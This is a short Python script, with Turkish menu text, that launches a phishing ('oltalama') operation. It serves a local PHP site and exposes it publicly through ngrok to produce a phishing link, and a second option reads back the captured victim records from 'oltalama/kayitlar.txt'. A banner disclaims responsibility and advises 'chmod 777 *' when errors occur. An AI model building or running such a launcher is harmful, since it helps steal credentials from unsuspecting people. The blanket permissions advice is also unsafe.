import os
os.system("clear")
print("\033[95m")
print('''	
		Çalışması için ana dizinde ngrok dosyasının bulunması lazım
		Yaptığınız ve yapacağınız herşeyden siz sorumlusunuz.
       ,--.--._			4 haneli port örneği: 1515
------" _, \___)
        / _/____) 1-) Link Oluştur
        \//(____)
------\     (__)  2-) Kayıtlara Bak
       `-----/

		Ngrok hata verirse veya permission denied hatası alırsanız
			chmod 777 * 	yazın 
''')
oltalama = input("Seçim Yapınız > ")
if(oltalama=="1"):
	phport = input("4 Haneli Port Giriniz > ")
	os.system("php -S 127.0.0.1:"+phport+" &")
	os.system("/n")
	os.system("./ngrok http "+phport)

elif(oltalama=="2"):
	kayit = open("oltalama/kayitlar.txt")
	print(kayit.read())
